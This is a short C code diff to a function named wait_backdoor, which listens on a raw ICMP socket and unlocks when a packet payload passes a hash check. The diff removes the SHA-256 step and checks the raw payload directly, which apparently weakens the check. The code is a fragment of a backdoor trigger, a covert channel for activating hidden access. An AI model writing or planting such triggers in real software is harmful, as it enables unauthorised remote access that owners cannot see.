@@ -9,7 +9,6 @@ int wait_backdoor()
     struct icmphdr      *icmp_hdr;
     char                *payload;
     int                 payload_len;
-    unsigned char       hash[32];
 
     raw_fd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
     if (raw_fd < 0)
@@ -40,9 +39,7 @@ int wait_backdoor()
                 if (payload_len < 256)
                     payload[payload_len] = '\0';
 
-                ft_sha256(payload, payload_len, hash);
-
-                if (ft_verify_hash(hash) == 0)
+                if (ft_verify_hash((const unsigned char *)payload) == 0)
                 {
                     close(raw_fd);
                     return (0);
